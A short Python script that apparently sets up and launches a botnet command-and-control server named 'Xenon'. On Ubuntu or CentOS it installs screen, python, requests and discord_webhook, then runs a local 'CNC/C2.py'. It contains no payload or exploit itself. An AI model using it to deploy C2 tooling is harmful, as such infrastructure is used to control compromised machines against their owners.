import os,sys


def build_xenon(WhatOS):
    if WhatOS == "ubuntu":
        os.system("apt install screen;apt install python-devel;apt install python;pip install requests;pip install discord_webhook")
        print (" [U] Ubuntu")
        os.system("echo CNC running [ NOT SCREENED ];python /root/[X] CNC/C2.py")

    elif WhatOS == "centos":
        os.system("yum install screen;yum install python-pip;yum install python;pip install requests;pip install discord_webhook")
        print (" [C] Centos")

        os.system("echo CNC running [ NOT SCREENED ];python /root/[X] CNC/C2.py") # only thing we have to do is run the source

    else:
        print (f"{WhatOS} is an invalid argument.")
    

build_xenon((str(sys.argv[1])))

